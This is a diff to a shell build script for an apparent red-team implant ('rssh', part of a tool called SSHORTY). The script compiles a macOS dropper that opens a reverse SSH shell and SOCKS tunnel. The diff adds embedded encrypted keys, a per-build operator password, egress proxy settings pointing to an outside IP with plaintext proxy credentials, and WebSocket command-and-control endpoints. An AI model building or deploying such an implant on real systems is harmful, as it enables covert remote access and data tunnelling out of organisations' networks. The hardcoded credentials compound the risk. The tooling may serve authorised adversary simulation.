@@ -83,13 +83,18 @@ SSHServerPort=222
 # You just need an OS account the private key the implant has to connect to the SSH server with
 SSHServerUser=4fa48c653682c3b04add14f434a3114
 
-# Implant SSH protected private key
+## Implant SSH protected private key
+# Option A: Local encrypted key wrapped in Base64 which gets embedded into the implant
+# If file is embedded no remote SSH key fetch is made from the hosting server
+SSHServerUserKey=$( /bin/cat "./keys/agentx.sshkey_kg_enc.b64" )
+
+# Option B: if the key needs to be pulled remotely
 # The agent pulls the protected key and decrypts a key with a password.
 # This is not SSH PK encryption, but a SSHORTY's "on the wire" protection scheme.
 # Why not a direct pass-phrase encrypted SSH PK? Because there are a ton of SSH key file formats.
 # For now we want to deal with a straight RSA 4096 keys, without relying on OpenSSH format quirks.
 # tool: keygen.go
-SSHServerUserKeyUrl="http://127.0.0.1:9000/agentx.sshkey_kg_enc"
+SSHServerUserKeyUrl="http://127.0.0.1:9000/agentx.sshkey_kg_enc.b64"
 
 # Implant SSH protection password (wire safety)
 # tool: keygen.go
@@ -112,20 +117,32 @@ SSHRemoteSocksPort=1080
 SSHRemoteCmdUser=operator
 
 # Operator Implant logon (password)
-# Randomized on every build
-SSHRemoteCmdPwd=$( dd if=/dev/urandom bs=1024 count=1 status=none | shasum | cut -c 1-31  )
+# Randomized on every build.
+# Ex: SSHRemoteCmdPwd=da39a3ee5e6b4b0d3255bfef9560189
+SSHRemoteCmdPwd=$( dd if=/dev/urandom bs=1024 count=1 | shasum | cut -c 1-31  )
 
-#SSHShell="/bin/bash"
+# The implant introspects SHELL variable from the destination environment,
+# If it is undefined it falls back to this:
+SSHShell="/bin/sh"
 
-#--------------- Transport ------------------#
-# How do we get to the SSH tunnel
-# First mile out from the enterprise
-# HTTP/S proxy:
-# TODO: implement credentials
+#--------------- :: Transport :: -----------------#
+# How do we get to the SSH tunnel.  WS/WSS and Proxies
 
-#HTTPProxy="http://127.0.0.1:8088" # Burp
+# Intercepting Proxy (Burp)
+# export http_proxy="http://127.0.0.1:8088"
+HTTPProxyFromEnvironment="yes"
 
-#--------------- Armorized Carrier-----------#
+# Egress proxy
+# TODO: HTTP/S proxy
+HTTPProxy="http://167.99.88.24:8080" # Squid
+
+# Egress proxy auth (plain)
+# TODO: research NTLM if needed  https://github.com/vadimi/go-http-ntlm
+HTTPProxyAuthUser="companyuser"
+HTTPProxyAuthPass="Drag0n"
+
+
+#---------- :: Armorized Carrier :: ---------------#
 # WS/WSS endpoint:
 HTTPEndpoint="http://167.99.88.24:8082"
 
@@ -135,10 +152,19 @@ WSEndpoint="wss://167.99.88.24:8082/stream"
 # Implant Exe name
 DropperName="rssh"
 
-# Implant Testing
+
+#----------- :: Implant Daemon and Debugging :: ---#
+# Background and detach from console. Currently, not very elegant (no setsid(), no renaming)
+Daemonize="no"
+
+# Log progress messages to file (local debug)
+# We do not want to log in production, but we want to debug to a log file locally
 LogFile="/tmp/rssh.log"
 
-Daemonize="false"
+# Track the implant PID
+PIDFile="/tmp/rssh.pid"
+
+
 
 echo "[*] Building dropper"
 export GOOS=darwin GOARCH=amd64
@@ -149,6 +175,7 @@ go build -ldflags \
      -X main.SSHServerPort=${SSHServerPort}  \
      -X main.SSHServerHost=${SSHServerHost} \
      -X main.SSHServerUser=${SSHServerUser} \
+     -X main.SSHServerUserKey=${SSHServerUserKey} \
      -X main.SSHServerUserKeyUrl=${SSHServerUserKeyUrl} \
      -X main.SSHServerUserKeyPassphrase=${SSHServerUserKeyPassphrase} \
      -X main.SSHRemoteCmdHost=${SSHRemoteCmdHost}  \
@@ -157,11 +184,15 @@ go build -ldflags \
      -X main.SSHRemoteCmdPwd=${SSHRemoteCmdPwd} \
      -X main.SSHRemoteSocksHost=${SSHRemoteSocksHost} \
      -X main.SSHRemoteSocksPort=${SSHRemoteSocksPort} \
+     -X main.HTTPProxyFromEnvironment=${HTTPProxyFromEnvironment} \
      -X main.HTTPProxy=${HTTPProxy} \
+     -X main.HTTPProxyAuthUser=${HTTPProxyAuthUser} \
+     -X main.HTTPProxyAuthPass=${HTTPProxyAuthPass} \
      -X main.HTTPEndpoint=${HTTPEndpoint} \
      -X main.WSEndpoint=${WSEndpoint} \
-     -X main.LogFile=${LogFile}  \
-     -X main.Daemonize=${Daemonize} " \
+     -X main.LogFile=${LogFile} \
+     -X main.PIDFile=${PIDFile}  \
+     -X main.Daemonize=${Daemonize}" \
      -o ${DropperName} ./rssh.go \
      ./types.go ./vars.go ./Pty.go ./socksport.go ./keymgmt.go ./traffic.go
 
@@ -183,6 +214,9 @@ then
     printf "    %s\n" "SSH-RTS SSHRemoteSocksPort=${SSHRemoteSocksPort}"
     printf "    %s\n" "SSH-RT shell agent password: ${SSHRemoteCmdPwd} "
     printf "    %s\n" "HTTP Proxy: ${HTTPProxy} "
+    printf "    %s\n" "HTTP Proxy:(from env?) ${HTTPProxyFromEnvironment} "
+    printf "    %s\n" "HTTP Proxy AuthUser ${HTTPProxyAuthUser} "
+    printf "    %s\n" "HTTP Proxy AuthPass ${HTTPProxyAuthPass+<masked>} "
     printf "    %s\n" "HTTP Endpoint: ${HTTPEndpoint} "
     printf "    %s\n" "WS Endpoint: ${WSEndpoint} "
     printf "    %s\n" "LogFile: ${LogFile} "
